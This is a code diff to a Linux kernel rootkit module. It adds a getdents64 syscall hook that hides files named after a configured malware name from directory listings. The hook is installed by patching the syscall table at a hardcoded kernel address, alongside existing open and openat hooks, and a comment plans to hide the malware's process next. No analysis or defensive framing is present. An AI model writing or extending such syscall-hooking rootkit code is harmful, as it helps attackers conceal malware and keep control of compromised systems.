@@ -1,4 +1,5 @@
 #include <linux/init.h>
+#include <linux/string.h>
 #include <linux/slab.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -23,6 +24,7 @@ char * malware_name = MALWARE_NAME;
 asmlinkage long (*original_sys_openat)(const struct pt_regs * regs);
 //asmlinkage long (*original_sys_open)(const char __user * filename, int flags, umode_t mode);
 asmlinkage long (*original_sys_open)(const struct pt_regs * regs);
+asmlinkage long (*original_sys_getdents64)(const struct pt_regs * regs);
 
 asmlinkage long mal_sys_openat(const struct pt_regs * regs)
 {
@@ -55,6 +57,19 @@ asmlinkage long mal_sys_open(const struct pt_regs * regs)
 		return original_sys_open(regs);
 }
 
+
+asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
+{
+	// check if file is included in getdents64 (ls source, readdir source)
+	long size = original_sys_getdents64(regs);
+	if (size > 0){
+		if (strstr(regs->si+0x20, malware_name)) {
+			// each call seeks file stream, so just return next
+			return original_sys_getdents64(regs);
+		}
+	}
+	return size; 
+}
 
 /**
 static void hide_task_struct(void)
@@ -115,17 +130,20 @@ static int __init rootkit_init(void)
 		//syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
 		//syscall_table = syscall_table_lookup();
 		// manually patch for now
-		syscall_table = (void *)0xffffffff88a002c0;
+		syscall_table = (void *)0xffffffffb1a002c0;
 		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", (uint64_t)syscall_table);
 
 		original_sys_open = syscall_table[__NR_open];
 		original_sys_openat = syscall_table[__NR_openat];
+		original_sys_getdents64 = syscall_table[__NR_getdents64];
 
 		printk(KERN_INFO "sys_open @ %llx\n", (uint64_t)original_sys_open);
 		printk(KERN_INFO "sys_openat @ %llx\n", (uint64_t)original_sys_openat);
+		printk(KERN_INFO "sys_getdents64 @ %llx\n", (uint64_t)original_sys_getdents64);
 
 		patch_syscall(__NR_open, mal_sys_open);
 		patch_syscall(__NR_openat, mal_sys_openat);
+		patch_syscall(__NR_getdents64, mal_sys_getdents64);
 
 		// TODO: find malware process and remove from process list
 		// hide_task_struct();
@@ -138,6 +156,7 @@ static void __exit rootkit_exit(void)
 		// repair syscall table
 		patch_syscall(__NR_openat, original_sys_openat);
 		patch_syscall(__NR_open, original_sys_open);
+		patch_syscall(__NR_getdents64, original_sys_getdents64);
 		printk(KERN_INFO "Exiting...\n");
 		return;
 }
